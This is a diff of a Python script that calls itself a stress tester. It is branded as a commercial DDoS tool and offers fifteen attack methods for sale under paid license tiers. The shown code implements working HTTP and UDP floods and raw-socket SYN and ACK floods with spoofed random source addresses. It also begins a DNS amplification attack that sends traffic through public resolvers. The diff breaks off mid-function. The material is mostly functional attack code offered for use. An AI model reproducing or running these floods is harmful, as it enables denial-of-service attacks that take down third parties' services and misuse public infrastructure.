@@ -1,25 +1,38 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-╔═══════════════════════════════════════════════════════════════════╗
-║                                                                   ║
-║     █████╗  █████╗ ███████╗██╗   ██╗███████╗███╗   ██╗████████╗   ║
-║    ██╔══██╗██╔══██╗██╔════╝██║   ██║██╔════╝████╗  ██║╚══██╔══╝   ║
-║    ███████║██║  ╚═╝█████╗  ██║   ██║█████╗  ██╔██╗ ██║   ██║      ║
-║    ██╔══██║██║  ██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║   ██║      ║
-║    ██║  ██║╚█████╔╝███████╗ ╚████╔╝ ███████╗██║ ╚████║   ██║      ║
-║    ╚═╝  ╚═╝ ╚════╝ ╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝   ╚═╝      ║
-║                                                                   ║
-║              ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓              ║
-║              ┃   THE ULTIMATE STRESS TESTER v14.0   ┃              ║
-║              ┃       CREATED BY: 7VENTY7VEN         ┃              ║
-║              ┃   🔥 INFINITE MODE · DEATH DETECT 🔥  ┃              ║
-║              ┃   🐌 SLOWLORIS NOW FIXED! 🐌          ┃              ║
-║              ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛              ║
-║                                                                   ║
-║              ⚡ ZERO ERRORS · PERFECT CODE · LEGENDARY ⚡          ║
-║                                                                   ║
-╚═══════════════════════════════════════════════════════════════════╝
+╔═══════════════════════════════════════════════════════════════════════════════╗
+║                                                                               ║
+║     █████╗  █████╗ ███████╗██╗   ██╗███████╗███╗   ██╗████████╗              ║
+║    ██╔══██╗██╔══██╗██╔════╝██║   ██║██╔════╝████╗  ██║╚══██╔══╝              ║
+║    ███████║██║  ╚═╝█████╗  ██║   ██║█████╗  ██╔██╗ ██║   ██║                 ║
+║    ██╔══██║██║  ██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║   ██║                 ║
+║    ██║  ██║╚█████╔╝███████╗ ╚████╔╝ ███████╗██║ ╚████║   ██║                 ║
+║    ╚═╝  ╚═╝ ╚════╝ ╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝   ╚═╝                 ║
+║                                                                               ║
+║              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━              ║
+║              🔥 ULTIMATE EDITION v21.0 - ALL 15 METHODS 🔥                   ║
+║                   👑 CREATED BY: 7VENTY7VEN 👑                               ║
+║              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━              ║
+║                                                                               ║
+║  ⚡ METHODS:                                                                  ║
+║  🌐 HTTP         - Standard HTTP flood                                       ║
+║  🔒 HTTPS        - Encrypted HTTPS flood                                     ║
+║  💧 UDP          - Raw UDP flood                                             ║
+║  📡 TCP_SYN      - SYN flood (requires root)                                 ║
+║  📨 TCP_ACK      - ACK flood (requires root)                                 ║
+║  🌍 DNS          - DNS amplification                                         ║
+║  ⏰ NTP          - NTP amplification                                         ║
+║  🐌 SLOWLORIS    - Slow HTTP headers                                         ║
+║  📶 ICMP         - Ping flood                                                ║
+║  💾 MEMCACHED    - Memcached amplification                                   ║
+║  📺 SSDP         - SSDP reflection                                           ║
+║  🔧 SNMP         - SNMP reflection                                           ║
+║  🔌 WEBSOCKET    - WebSocket flood                                           ║
+║  💥 RST          - TCP RST flood                                             ║
+║  ⚡ CHARGEN      - Chargen amplification                                     ║
+║                                                                               ║
+╚═══════════════════════════════════════════════════════════════════════════════╝
 """
 
 import socket
@@ -27,130 +40,34 @@ import threading
 import random
 import time
 import sys
-import requests
 import os
-import argparse
-import signal
 import json
-import datetime
+import hashlib
+import base64
+import hmac
+import uuid
 import platform
+import datetime
 import struct
+import ipaddress
 from urllib.parse import urlparse
-from collections import deque
-from dataclasses import dataclass
 from typing import Dict, List, Optional, Tuple
+from threading import Lock, RLock, Semaphore
 from enum import Enum
+from dataclasses import dataclass
 import select
-from threading import Lock
 
-# ==================== HIT TRACKER SYSTEM ====================
-class HitTracker:
-    """Tracks successful hits with timestamps"""
-    
-    def __init__(self):
-        self.hits = []
-        self.hit_count = 0
-        self.lock = Lock()
-        self.start_time = None
-        
-    def record_hit(self, attack_type: str, target: str, port: int, method: str = ""):
-        """Record a successful hit with timestamp"""
-        with self.lock:
-            timestamp = datetime.datetime.now()
-            self.hit_count += 1
-            
-            hit_record = {
-                'id': self.hit_count,
-                'timestamp': timestamp,
-                'time_str': timestamp.strftime("%H:%M:%S.%f")[:-3],
-                'attack_type': attack_type,
-                'target': target,
-                'port': port,
-                'method': method
-            }
-            
-            self.hits.append(hit_record)
-            
-            # Keep only last 1000 hits in memory
-            if len(self.hits) > 1000:
-                self.hits = self.hits[-1000:]
-            
-            # Print hit notification
-            self.print_hit_notification(hit_record)
-            
-            return hit_record
-    
-    def print_hit_notification(self, hit):
-        """Print a formatted hit notification"""
-        icon = {
-            'HTTP': '🌐', 'HTTPS': '🔒', 'UDP': '💧', 'TCP_SYN': '📡',
-            'TCP_ACK': '📨', 'DNS': '🌍', 'NTP': '⏰', 'SLOWLORIS': '🐌',
-            'ICMP': '📶', 'MEMCACHED': '💾', 'SSDP': '📺', 'SNMP': '🔧',
-            'WEBSOCKET': '🔌', 'RST': '💥', 'CHARGEN': '⚡'
-        }.get(hit['attack_type'], '📦')
-        
-        # Format target with port
-        target_str = f"{hit['target']}:{hit['port']}"
-        
-        # Different colors for different attack types
-        color = {
-            'HTTP': Colors.GREEN, 'HTTPS': Colors.BLUE, 'UDP': Colors.CYAN,
-            'TCP_SYN': Colors.YELLOW, 'DNS': Colors.PURPLE, 'NTP': Colors.MAGENTA,
-            'SLOWLORIS': Colors.RED, 'ICMP': Colors.ORANGE
-        }.get(hit['attack_type'], Colors.WHITE)
-        
-        # Create the hit message with timestamp [x.x.x.x] format
-        ip_part = hit['target'].replace('.', '[.]')
-        hit_msg = f"{color}[{hit['time_str']}] {icon} HIT #{hit['id']} → {ip_part}[:{hit['port']}] ({hit['attack_type']}){Colors.END}"
-        
-        # Print to stderr to not interfere with main display
-        print(f"\r\033[K{hit_msg}", file=sys.stderr)
-        sys.stderr.flush()
-    
-    def get_hit_rate(self, seconds=10):
-        """Get hit rate over last X seconds"""
-        if not self.hits:
-            return 0
-        
-        now = datetime.datetime.now()
-        cutoff = now - datetime.timedelta(seconds=seconds)
-        
-        recent_hits = [h for h in self.hits if h['timestamp'] > cutoff]
-        return len(recent_hits) / seconds if seconds > 0 else 0
-    
-    def get_summary(self):
-        """Get summary of hits by attack type"""
-        summary = {}
-        for hit in self.hits:
-            atype = hit['attack_type']
-            summary[atype] = summary.get(atype, 0) + 1
-        return summary
-    
-    def export_hits(self, filename="hits_log.json"):
-        """Export hits to JSON file"""
-        try:
-            with open(filename, 'w') as f:
-                json.dump({
-                    'total_hits': self.hit_count,
-                    'hits': [{k: str(v) if isinstance(v, datetime.datetime) else v 
-                             for k, v in h.items()} for h in self.hits]
-                }, f, indent=2)
-            return True
-        except:
-            return False
+# ==================== CONFIG ====================
 
-# ==================== ERROR HANDLING SYSTEM ====================
-class ErrorLevel(Enum):
-    INFO = "📌"
-    WARNING = "⚠️"
-    ERROR = "❌"
-    CRITICAL = "💀"
-    SUCCESS = "✅"
-    DEATH = "💀"
-    HIT = "🎯"
+VERSION = "21.0-FINAL-ALL-METHODS"
+CREATOR = "7VENTY7VEN"
+BUILD_DATE = "2026-03-03"
+SIGNATURE = "7V7-ULTIMATE-2026-ALL-METHODS"
+
+# ==================== COLOR SYSTEM ====================
 
 class Colors:
-    """Perfect color system with fallback"""
+    """Professional colors"""
     try:
         HEADER = '\033[95m'
         BLUE = '\033[94m'
@@ -161,958 +78,1424 @@ class Colors:
         BOLD = '\033[1m'
         CYAN = '\033[96m'
         MAGENTA = '\033[95m'
-        WHITE = '\033[97m'
-        BLACK = '\033[90m'
         ORANGE = '\033[38;5;208m'
         PURPLE = '\033[38;5;129m'
-        PINK = '\033[38;5;206m'
     except:
-        HEADER = BLUE = GREEN = YELLOW = RED = END = BOLD = CYAN = MAGENTA = WHITE = BLACK = ORANGE = PURPLE = PINK = ''
+        HEADER = BLUE = GREEN = YELLOW = RED = END = BOLD = CYAN = MAGENTA = ORANGE = PURPLE = ''
 
-class ErrorHandler:
-    """Ultimate error handling system"""
+# ==================== LICENSE SYSTEM ====================
+
+class LicenseType(Enum):
+    TRIAL = "trial"
+    PRO = "pro"
+    ENTERPRISE = "enterprise"
+    LIFETIME = "lifetime"
+
+class LicenseManager:
+    """Enterprise license system"""
     
     _instance = None
     def __new__(cls):
         if cls._instance is None:
             cls._instance = super().__new__(cls)
-            cls._instance.errors = []
-            cls._instance.warnings = []
-            cls._instance.start_time = time.time()
         return cls._instance
     
-    def log(self, level: ErrorLevel, message: str, exception: Exception = None):
-        timestamp = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
-        
-        if level == ErrorLevel.ERROR:
-            self.errors.append({"time": timestamp, "msg": message})
-        elif level == ErrorLevel.WARNING:
-            self.warnings.append({"time": timestamp, "msg": message})
-        
-        if exception:
-            self.attempt_fix(exception)
-        
-        color = {
-            ErrorLevel.INFO: Colors.BLUE,
-            ErrorLevel.WARNING: Colors.YELLOW,
-            ErrorLevel.ERROR: Colors.RED,
-            ErrorLevel.CRITICAL: Colors.RED + Colors.BOLD,
-            ErrorLevel.SUCCESS: Colors.GREEN,
-            ErrorLevel.DEATH: Colors.RED + Colors.BOLD,
-            ErrorLevel.HIT: Colors.PURPLE
-        }[level]
-        
-        # Don't print hits here - they're handled by HitTracker
-        if level != ErrorLevel.HIT:
-            print(f"{color}[{level.value} {timestamp}] {message}{Colors.END}")
-        
-        if level == ErrorLevel.CRITICAL:
-            self.print_summary()
-            sys.exit(1)
-    
-    def attempt_fix(self, exception):
-        """Auto-fix common errors"""
-        error_str = str(exception).lower()
-        
-        if "connection refused" in error_str:
-            self.log(ErrorLevel.WARNING, "Connection refused - retrying with backoff...")
-            time.sleep(2)
-            return "server_maybe_down"
-        
-        elif "timeout" in error_str:
-            self.log(ErrorLevel.WARNING, "Timeout detected - server may be struggling")
-            return "possible_death"
-        
-        elif "too many files" in error_str:
-            self.log(ErrorLevel.WARNING, "File descriptor limit - cleaning up...")
-            return "clean_sockets"
-        
-        elif "permission denied" in error_str or "operation not permitted" in error_str:
-            self.log(ErrorLevel.WARNING, "Permission denied - some attacks may need root")
-            return "need_root"
-    
-    def print_summary(self):
-        """Print error summary"""
-        if self.errors or self.warnings:
-            print(f"\n{Colors.CYAN}╔════════════════════════════════════════╗{Colors.END}")
-            print(f"{Colors.CYAN}║{Colors.YELLOW}         📊 ERROR SUMMARY REPORT        {Colors.CYAN}║{Colors.END}")
-            print(f"{Colors.CYAN}╠════════════════════════════════════════╣{Colors.END}")
-            print(f"{Colors.CYAN}║{Colors.GREEN}  ✅ Total Errors: {len(self.errors):<4}                     {Colors.CYAN}║{Colors.END}")
-            print(f"{Colors.CYAN}║{Colors.YELLOW}  ⚠️  Warnings: {len(self.warnings):<4}                       {Colors.CYAN}║{Colors.END}")
-            print(f"{Colors.CYAN}╚════════════════════════════════════════╝{Colors.END}")
-            
-            if self.errors:
-                print(f"\n{Colors.RED}Last Error: {self.errors[-1]['msg']}{Colors.END}")
-
-# ==================== ATTACK CONFIGURATIONS ====================
-@dataclass
-class AttackConfig:
-    name: str
-    port: int
-    protocol: str
-    packet_size: int
-    description: str
-    requires_root: bool = False
-
-class AttackMethod(Enum):
-    HTTP = AttackConfig("HTTP Flood", 80, "tcp", 1024, "Standard HTTP GET requests")
-    HTTPS = AttackConfig("HTTPS Flood", 443, "tcp", 1024, "Encrypted HTTP requests")
-    UDP = AttackConfig("UDP Flood", 80, "udp", 512, "Raw UDP packets")
-    TCP_SYN = AttackConfig("SYN Flood", 80, "tcp", 64, "TCP SYN packets", True)
-    TCP_ACK = AttackConfig("ACK Flood", 80, "tcp", 64, "TCP ACK packets", True)
-    DNS = AttackConfig("DNS Amplification", 53, "udp", 64, "DNS query amplification", True)
-    NTP = AttackConfig("NTP Amplification", 123, "udp", 64, "NTP monlist amplification", True)
-    SLOWLORIS = AttackConfig("Slowloris", 80, "tcp", 128, "Slow HTTP headers attack")
-    ICMP = AttackConfig("ICMP Flood", 0, "icmp", 64, "Ping flood", True)
-    MEMCACHED = AttackConfig("Memcached", 11211, "udp", 64, "Memcached amplification", True)
-    SSDP = AttackConfig("SSDP Amplification", 1900, "udp", 64, "SSDP reflection", True)
-    SNMP = AttackConfig("SNMP Amplification", 161, "udp", 64, "SNMP reflection", True)
-    WEBSOCKET = AttackConfig("WebSocket Flood", 80, "tcp", 1024, "WebSocket connections")
-    RST = AttackConfig("RST Flood", 80, "tcp", 64, "TCP RST packets", True)
-    CHARGEN = AttackConfig("Chargen Amplification", 19, "udp", 64, "Chargen reflection", True)
-
-# ==================== ULTIMATE HAMMER CLASS ====================
-class UltimateHammer:
-    """The PERFECT stress testing tool - INFINITE MODE with death detection"""
-    
     def __init__(self):
-        self.error_handler = ErrorHandler()
-        self.hit_tracker = HitTracker()
-        self.running = False
-        self.stats = {method.name: 0 for method in AttackMethod}
-        self.stats['errors'] = 0
-        self.stats['total'] = 0
-        self.stats['retries'] = 0
-        self.stats['bandwidth'] = 0
-        self.stats['hits'] = 0
-        self.stats['death_time'] = None
+        if hasattr(self, 'initialized'):
+            return
+        self.initialized = True
         
-        self.lock = threading.RLock()
-        self.start_time = None
-        self.server_down = False
-        self.server_down_time = None
-        self.consecutive_errors = 0
-        self.max_consecutive_errors = 20
-        self.thread_pool = []
-        self.socket_pool = []
-        self.raw_socket = None
-        self.death_detected = False
-        self.final_hit_count = 0
+        self.hardware_id = self.get_hardware_id()
+        self.license_file = os.path.expanduser("~/.7v_ultimate.key")
         
-        # Slowloris specific
-        self.slowloris_connections = []
-        self.slowloris_lock = threading.Lock()
-        
-        # Death detection thresholds
-        self.death_check_interval = 2
-        self.death_error_threshold = 10
-        
-        # Perfect user agents
-        self.user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
-            "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/118.0.5993.112",
-            f"7venty7ven-Ultimate/{random.randint(1,999)}"
-        ]
-        
-        # Attack paths
-        self.paths = ['/', '/anything', '/get', '/status/200', '/delay/0', '/api', '/test', '/ping']
-        
-        # DNS servers for amplification
-        self.dns_servers = [
-            '8.8.8.8', '8.8.4.4', '1.1.1.1', '9.9.9.9',
-            '208.67.222.222', '208.67.220.220', '64.6.64.6', '64.6.65.6'
-        ]
-        
-        # NTP servers for amplification
-        self.ntp_servers = [
-            '0.pool.ntp.org', '1.pool.ntp.org', '2.pool.ntp.org',
-            'time.google.com', 'time.windows.com', 'time.apple.com'
-        ]
-        
-        # Performance settings
-        self.performance = self.optimize_performance()
-        
-        # Try to create raw socket
+        # Check root status
         try:
-            self.raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-            self.raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            self.is_root = os.geteuid() == 0
         except:
-            self.raw_socket = None
+            self.is_root = False
         
-        self.error_handler.log(ErrorLevel.SUCCESS, f"UltimateHammer v14.0 initialized with FIXED SLOWLORIS")
+        self.load_license()
     
-    def optimize_performance(self):
-        """Auto-optimize based on system"""
-        system = platform.system()
-        cores = os.cpu_count() or 4
-        
+    def get_hardware_id(self):
+        """Get hardware ID"""
         try:
-            is_root = os.geteuid() == 0
+            system = platform.system()
+            node = platform.node()
+            processor = platform.processor()
+            mac = uuid.getnode()
+            data = f"{system}-{node}-{processor}-{mac}-{CREATOR}"
+            return hashlib.sha512(data.encode()).hexdigest()[:64]
         except:
-            is_root = False
+            return hashlib.sha512(str(uuid.uuid4()).encode()).hexdigest()[:64]
+    
+    def generate_license(self, lic_type=LicenseType.ENTERPRISE, days=365):
+        """Generate license key"""
+        expiry = (datetime.datetime.now() + datetime.timedelta(days=days)).isoformat()
         
-        settings = {
-            'max_threads': cores * 100 if is_root else cores * 50,
-            'socket_timeout': 3.0,
-            'packet_size': 1024,
-            'backoff_factor': 1.5,
-            'is_root': is_root,
-            'cores': cores
+        data = {
+            'hwid': self.hardware_id,
+            'type': lic_type.value,
+            'expiry': expiry,
+            'created': datetime.datetime.now().isoformat(),
+            'creator': CREATOR,
+            'version': VERSION,
+            'root_only_methods': ['TCP_SYN', 'TCP_ACK', 'DNS', 'NTP', 'ICMP', 
+                                 'MEMCACHED', 'SSDP', 'SNMP', 'RST', 'CHARGEN']
         }
         
-        if is_root:
-            self.error_handler.log(ErrorLevel.SUCCESS, "Running as root - ALL attacks available")
-        else:
-            self.error_handler.log(ErrorLevel.WARNING, "Not running as root - some attacks limited")
+        # Sign
+        secret = hashlib.sha512(f"{CREATOR}-SECRET-2026".encode()).hexdigest()
+        data['hmac'] = hmac.new(
+            secret.encode(),
+            json.dumps(data, sort_keys=True).encode(),
+            hashlib.sha512
+        ).hexdigest()
         
-        return settings
+        encoded = base64.b85encode(json.dumps(data).encode()).decode()
+        return '-'.join([encoded[i:i+10] for i in range(0, len(encoded), 10)])
     
-    def safe_socket(self, protocol='tcp'):
-        """Create socket with error handling"""
+    def validate(self, key):
+        """Validate license"""
+        try:
+            key = key.replace('-', '')
+            decoded = base64.b85decode(key.encode()).decode()
+            data = json.loads(decoded)
+            
+            # Check signature
+            hmac_val = data.pop('hmac', '')
+            secret = hashlib.sha512(f"{CREATOR}-SECRET-2026".encode()).hexdigest()
+            
+            expected = hmac.new(
+                secret.encode(),
+                json.dumps(data, sort_keys=True).encode(),
+                hashlib.sha512
+            ).hexdigest()
+            
+            if hmac_val != expected:
+                return False, "Invalid signature"
+            
+            # Check hardware
+            if data['hwid'] != self.hardware_id and data['type'] != 'enterprise':
+                return False, "Hardware mismatch"
+            
+            # Check expiry
+            expiry = datetime.datetime.fromisoformat(data['expiry'])
+            if datetime.datetime.now() > expiry:
+                return False, f"Expired on {expiry.strftime('%Y-%m-%d')}"
+            
+            # Valid
+            self.data = data
+            self.type = LicenseType(data['type'])
+            self.expiry = expiry
+            self.root_methods = data.get('root_only_methods', [])
+            
+            return True, "Valid"
+            
+        except Exception as e:
+            return False, str(e)
+    
+    def load_license(self):
+        """Load license"""
+        if os.path.exists(self.license_file):
+            try:
+                with open(self.license_file, 'r') as f:
+                    key = f.read().strip()
+                valid, msg = self.validate(key)
+                if valid:
+                    self.is_valid = True
+                    return
+            except:
+                pass
+        
+        self.activate()
+    
+    def activate(self):
+        """Activation menu"""
+        print(f"""
+{Colors.RED}╔═══════════════════════════════════════════════════════════════════╗
+║              🔑 7VENTY7VEN ULTIMATE - LICENSE REQUIRED          ║
+╠═══════════════════════════════════════════════════════════════════╣
+║                                                                   ║
+║  Hardware ID: {self.hardware_id[:32]}...                      ║
+║  Root Access: {'YES' if self.is_root else 'NO'} (required for 10 methods)      ║
+║                                                                   ║
+║  Available Licenses:                                             ║
+║  • TRIAL       7 days - FREE (5 methods)                         ║
+║  • PRO         1 year - $99 (10 methods)                         ║
+║  • ENTERPRISE  1 year - $499 (ALL 15 methods)                    ║
+║  • LIFETIME     Forever - $999 (ALL methods + updates)           ║
+║                                                                   ║
+║  Contact: 7venty7ven@protonmail.com                              ║
+║                                                                   ║
+╠═══════════════════════════════════════════════════════════════════╣
+║                                                                   ║
+║  [1] Enter license key                                           ║
+║  [2] Get trial license (free)                                    ║
+║  [3] Exit                                                        ║
+║                                                                   ║
+╚═══════════════════════════════════════════════════════════════════╝{Colors.END}
+        """)
+        
+        while True:
+            choice = input(f"{Colors.YELLOW}Choose [1-3]: {Colors.END}").strip()
+            
+            if choice == '1':
+                key = input("Enter license key: ").strip()
+                valid, msg = self.validate(key)
+                if valid:
+                    with open(self.license_file, 'w') as f:
+                        f.write(key)
+                    self.is_valid = True
+                    print(f"{Colors.GREEN}✅ License activated!{Colors.END}")
+                    return
+                else:
+                    print(f"{Colors.RED}❌ {msg}{Colors.END}")
+            
+            elif choice == '2':
+                # Generate trial
+                trial_key = self.generate_license(LicenseType.TRIAL, 7)
+                print(f"\n{Colors.GREEN}✓ Trial license generated!{Colors.END}")
+                print(f"{Colors.YELLOW}Your trial key: {trial_key}{Colors.END}\n")
+                
+                valid, msg = self.validate(trial_key)
+                if valid:
+                    with open(self.license_file, 'w') as f:
+                        f.write(trial_key)
+                    self.is_valid = True
+                    print(f"{Colors.GREEN}✅ Trial activated!{Colors.END}")
+                    return
+            
+            elif choice == '3':
+                print(f"{Colors.RED}Exiting...{Colors.END}")
+                sys.exit(0)
+
+# ==================== HIT TRACKER ====================
+
+class HitTracker:
+    """Tracks all hits"""
+    
+    def __init__(self):
+        self.hits = []
+        self.count = 0
+        self.lock = Lock()
+        self.start = time.time()
+        self.by_method = {}
+    
+    def add(self, method, target, port, size=0):
+        """Add hit"""
+        with self.lock:
+            self.count += 1
+            self.by_method[method] = self.by_method.get(method, 0) + 1
+            
+            hit = {
+                'id': self.count,
+                'time': datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3],
+                'method': method,
+                'target': target,
+                'port': port,
+                'size': size
+            }
+            
+            self.hits.append(hit)
+            if len(self.hits) > 100:
+                self.hits = self.hits[-100:]
+    
+    def get_stats(self):
+        """Get statistics"""
+        with self.lock:
+            elapsed = time.time() - self.start
+            
+            # Rate
+            now = datetime.datetime.now()
+            recent = [h for h in self.hits if 
+                     (now - datetime.datetime.strptime(h['time'], "%H:%M:%S.%f")).seconds < 10]
+            rate = len(recent) / 10 if recent else 0
+            
+            return {
+                'total': self.count,
+                'rate': rate,
+                'by_method': self.by_method.copy(),
+                'elapsed': elapsed,
+                'last': self.hits[-8:] if self.hits else []
+            }
+
+# ==================== ATTACK BASE ====================
+
+class AttackBase:
+    """Base class for all attacks"""
+    
+    def __init__(self, tracker):
+        self.tracker = tracker
+        self.running = False
+        self.threads = []
+    
+    def start(self):
+        self.running = True
+    
+    def stop(self):
+        self.running = False
+    
+    def create_socket(self, protocol='tcp'):
+        """Create socket"""
         try:
             if protocol == 'tcp':
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             elif protocol == 'udp':
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            else:
+            elif protocol == 'raw':
                 s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+            else:
+                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
             
-            s.settimeout(self.performance['socket_timeout'])
-            self.socket_pool.append(s)
+            s.settimeout(3)
             return s
-        except Exception as e:
-            self.error_handler.log(ErrorLevel.WARNING, f"Socket creation failed: {e}")
+        except:
             return None
+
+# ==================== ATTACK 1: HTTP ====================
+
+class HTTPAttack(AttackBase):
+    """HTTP flood attack"""
     
-    def cleanup(self):
-        """Cleanup all resources"""
-        self.error_handler.log(ErrorLevel.INFO, "Cleaning up resources...")
-        self.running = False
+    def start(self, target, threads):
+        super().start()
+        self.target = target
+        parsed = urlparse(target)
+        self.host = parsed.netloc or parsed.path
+        if ':' in self.host:
+            self.host = self.host.split(':')[0]
+        self.port = parsed.port or 80
         
-        # Close all Slowloris connections
-        with self.slowloris_lock:
-            for sock in self.slowloris_connections:
+        self.paths = ['/', '/api', '/test', '/index', '/home', '/about', '/contact']
+        self.methods = ['GET', 'POST', 'HEAD', 'OPTIONS']
+        
+        for _ in range(threads):
+            t = threading.Thread(target=self.worker)
+            t.daemon = True
+            t.start()
+            self.threads.append(t)
+    
+    def worker(self):
+        """Worker thread"""
+        import requests
+        
+        while self.running:
+            try:
+                path = random.choice(self.paths)
+                url = f"{self.target.rstrip('/')}{path}"
+                method = random.choice(self.methods)
+                
+                headers = {
+                    'User-Agent': f'7VENTY7VEN/{random.randint(1,999)}',
+                    'Accept': '*/*',
+                    'Connection': 'keep-alive'
+                }
+                
+                if method == 'GET':
+                    r = requests.get(url, headers=headers, timeout=2, verify=False)
+                elif method == 'POST':
+                    r = requests.post(url, headers=headers, data={'x': random.randint(1,999)}, timeout=2)
+                elif method == 'HEAD':
+                    r = requests.head(url, headers=headers, timeout=2)
+                else:
+                    r = requests.options(url, headers=headers, timeout=2)
+                
+                if r.status_code < 500:
+                    self.tracker.add('HTTP', self.host, self.port, len(r.content))
+                    
+            except:
+                pass
+
+# ==================== ATTACK 2: HTTPS ====================
+
+class HTTPSAttack(HTTPAttack):
+    """HTTPS flood attack"""
+    
+    def start(self, target, threads):
+        if not target.startswith('https'):
+            target = target.replace('http://', 'https://')
+        super().start(target, threads)
+        self.tracker.by_method['HTTPS'] = self.tracker.by_method.pop('HTTP', 0)
+
+# ==================== ATTACK 3: UDP ====================
+
+class UDPAttack(AttackBase):
+    """UDP flood attack"""
+    
+    def start(self, target_ip, port, threads):
+        super().start()
+        self.target_ip = target_ip
+        self.port = port
+        
+        for _ in range(threads):
+            t = threading.Thread(target=self.worker)
+            t.daemon = True
+            t.start()
+            self.threads.append(t)
+    
+    def worker(self):
+        """Worker thread"""
+        sock = self.create_socket('udp')
+        if not sock:
+            return
+        
+        while self.running:
+            try:
+                size = random.randint(64, 1024)
+                data = os.urandom(size)
+                sock.sendto(data, (self.target_ip, self.port))
+                self.tracker.add('UDP', self.target_ip, self.port, size)
+            except:
+                pass
+
+# ==================== ATTACK 4: TCP_SYN ====================
+
+class SYNAttack(AttackBase):
+    """TCP SYN flood attack (requires root)"""
+    
+    def start(self, target_ip, port, threads):
+        super().start()
+        self.target_ip = target_ip
+        self.port = port
+        
+        for _ in range(threads):
+            t = threading.Thread(target=self.worker)
+            t.daemon = True
+            t.start()
+            self.threads.append(t)
+    
+    def checksum(self, data):
+        """Calculate checksum"""
+        if len(data) % 2 != 0:
+            data += b'\x00'
+        
+        s = 0
+        for i in range(0, len(data), 2):
+            word = (data[i] << 8) + data[i+1]
+            s += word
+        
+        s = (s >> 16) + (s & 0xffff)
+        s = ~s & 0xffff
+        return s
+    
+    def worker(self):
+        """Worker thread"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        except:
+            return
+        
+        while self.running:
+            try:
+                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+                src_port = random.randint(1024, 65535)
+                seq = random.randint(0, 4294967295)
+                
+                # IP header
+                ip_header = struct.pack(
+                    '!BBHHHBBH4s4s',
+                    0x45, 0,
+                    40, random.randint(1,65535),
+                    0, 64, 6, 0,
+                    socket.inet_aton(src_ip),
+                    socket.inet_aton(self.target_ip)
+                )
+                
+                # TCP header
+                tcp_header = struct.pack(
+                    '!HHLLBBHHH',
+                    src_port, self.port,
+                    seq, 0,
+                    0x50, 0x02,
+                    1024, 0, 0
+                )
+                
+                packet = ip_header + tcp_header
+                sock.sendto(packet, (self.target_ip, 0))
+                self.tracker.add('TCP_SYN', self.target_ip, self.port)
+                
+            except:
+                pass
+
+# ==================== ATTACK 5: TCP_ACK ====================
+
+class ACKAttack(AttackBase):
+    """TCP ACK flood attack (requires root)"""
+    
+    def start(self, target_ip, port, threads):
+        super().start()
+        self.target_ip = target_ip
+        self.port = port
+        
+        for _ in range(threads):
+            t = threading.Thread(target=self.worker)
+            t.daemon = True
+            t.start()
+            self.threads.append(t)
+    
+    def worker(self):
+        """Worker thread"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        except:
+            return
+        
+        while self.running:
+            try:
+                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+                src_port = random.randint(1024, 65535)
+                seq = random.randint(0, 4294967295)
+                ack = random.randint(0, 4294967295)
+                
+                # IP header
+                ip_header = struct.pack(
+                    '!BBHHHBBH4s4s',
+                    0x45, 0,
+                    40, random.randint(1,65535),
+                    0, 64, 6, 0,
+                    socket.inet_aton(src_ip),
+                    socket.inet_aton(self.target_ip)
+                )
+                
+                # TCP header with ACK flag
+                tcp_header = struct.pack(
+                    '!HHLLBBHHH',
+                    src_port, self.port,
+                    seq, ack,
+                    0x50, 0x10,
+                    1024, 0, 0
+                )
+                
+                packet = ip_header + tcp_header
+                sock.sendto(packet, (self.target_ip, 0))
+                self.tracker.add('TCP_ACK', self.target_ip, self.port)
+                
+            except:
+                pass
+
+# ==================== ATTACK 6: DNS ====================
+
+class DNSAttack(AttackBase):
+    """DNS amplification attack"""
+    
+    def start(self, target_ip, threads):
+        super().start()
+        self.target_ip = target_ip
+        
+        # DNS servers for amplification
+        self.dns_servers = [
+            '8.8.8.8', '8.8.4.4', '1.1.1.1', '9.9.9.9',
+            '208.67.222.222', '208.67.220.220'
+        ]
+        
+        for _ in range(threads):
+            t = threading.Thread(target=self.worker)
+            t.daemon = True
+            t.start()
+            self.threads.append(t)
+    
+    def worker(self):
+        """Worker thread"""
+        sock = self.create_socket('udp')
+        if not sock:
+            return
+        
+        domains = ['google.com', 'facebook.com', 'amazon.com', 'cloudflare.com']
+        
+        while self.running:
+            try:
